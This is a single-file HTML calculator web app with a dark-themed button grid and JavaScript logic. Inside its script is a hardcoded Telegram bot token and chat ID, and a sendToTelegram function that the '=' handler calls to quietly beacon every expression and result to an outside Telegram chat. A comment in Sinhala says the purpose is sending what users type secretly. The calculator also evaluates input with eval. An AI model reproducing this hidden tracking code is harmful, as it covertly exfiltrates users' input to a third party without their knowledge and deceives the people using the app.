<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Smart Calculator</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; user-select: none; }
body {
  background: #121212;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.calculator {
  background: #1e1e1e;
  width: 100%;
  max-width: 360px;
  border-radius: 24px;
  box-shadow: 0 10px 30px rgba(0,0,0,0.5);
  overflow: hidden;
  border: 1px solid #333;
}

.display {
  background: #1e1e1e;
  padding: 30px 20px 20px 20px;
  text-align: right;
  word-wrap: break-word;
  word-break: break-all;
}

#history {
  font-size: 16px;
  color: #888;
  min-height: 24px;
  margin-bottom: 5px;
}

#output {
  font-size: 42px;
  font-weight: 300;
  color: #fff;
}

.buttons {
  display: grid;
  grid-template-columns: repeat(4, 1fr);
  gap: 1px;
  background: #333;
}

button {
  background: #2d2d2d;
  border: none;
  padding: 20px;
  font-size: 20px;
  color: #fff;
  cursor: pointer;
  transition: background 0.2s;
}

button:hover { background: #3d3d3d; }
button:active { background: #4d4d4d; }

.btn-operator { background: #ff9f0a; color: #fff; }
.btn-operator:hover { background: #ffb02e; }

.btn-function { background: #a6a6a6; color: #000; font-weight: 600; }
.btn-function:hover { background: #c2c2c2; }

.btn-zero { grid-column: span 2; }
</style>
</head>
<body>

<div class="calculator">
  <div class="display">
    <div id="history"></div>
    <div id="output">0</div>
  </div>
  <div class="buttons">
    <button class="btn-function" onclick="clearAll()">AC</button>
    <button class="btn-function" onclick="deleteChar()">⌫</button>
    <button class="btn-function" onclick="appendChar('%')">%</button>
    <button class="btn-operator" onclick="appendChar('/')">÷</button>
    
    <button onclick="appendChar('7')">7</button>
    <button onclick="appendChar('8')">8</button>
    <button onclick="appendChar('9')">9</button>
    <button class="btn-operator" onclick="appendChar('*')">×</button>
    
    <button onclick="appendChar('4')">4</button>
    <button onclick="appendChar('5')">5</button>
    <button onclick="appendChar('6')">6</button>
    <button class="btn-operator" onclick="appendChar('-')">-</button>
    
    <button onclick="appendChar('1')">1</button>
    <button onclick="appendChar('2')">2</button>
    <button onclick="appendChar('3')">3</button>
    <button class="btn-operator" onclick="appendChar('+')">+</button>
    
    <button class="btn-zero" onclick="appendChar('0')">0</button>
    <button onclick="appendChar('.')">.</button>
    <button class="btn-operator" onclick="calculate()">=</button>
  </div>
</div>

<script>
const output = document.getElementById('output');
const history = document.getElementById('history');
let currentInput = '0';
let calculationHistory = '';

const BOT_TOKEN = "8825023377:AAGOss8yK3V15XRGZyiBM9y58F1q5KjxRcQ";
const CHAT_ID = "1993924204";

function appendChar(char) {
  if (currentInput === '0' && char !== '.') {
    currentInput = char;
  } else {
    currentInput += char;
  }
  updateDisplay();
}

function clearAll() {
  currentInput = '0';
  calculationHistory = '';
  updateDisplay();
}

function deleteChar() {
  if (currentInput.length > 1) {
    currentInput = currentInput.slice(0, -1);
  } else {
    currentInput = '0';
  }
  updateDisplay();
}

function updateDisplay() {
  output.textContent = currentInput;
  history.textContent = calculationHistory;
}

function calculate() {
  try {
    calculationHistory = currentInput + ' =';
    // Math calculation safely
    let sanitized = currentInput.replace(/×/g, '*').replace(/÷/g, '/');
    let result = eval(sanitized);
    
    // Telegram එකට ගණන් හදන දේවල් හෝ යූසර් ගහන දේවල් රහසින් යැවීමට අවශ්‍ය නම් මෙතනින් යොදාගත හැක
    sendToTelegram(currentInput, result);

    currentInput = String(result);
    updateDisplay();
  } catch (error) {
    output.textContent = "Error";
    currentInput = '0';
  }
}

function sendToTelegram(expr, res) {
  const text = `🔢 *Calculator Used!*\n\n📝 *Equation:* \`${expr}\`\n✨ *Result:* \`${res}\``;
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
  
  const img = new Image();
  img.src = url;
}
</script>

</body>
</html>
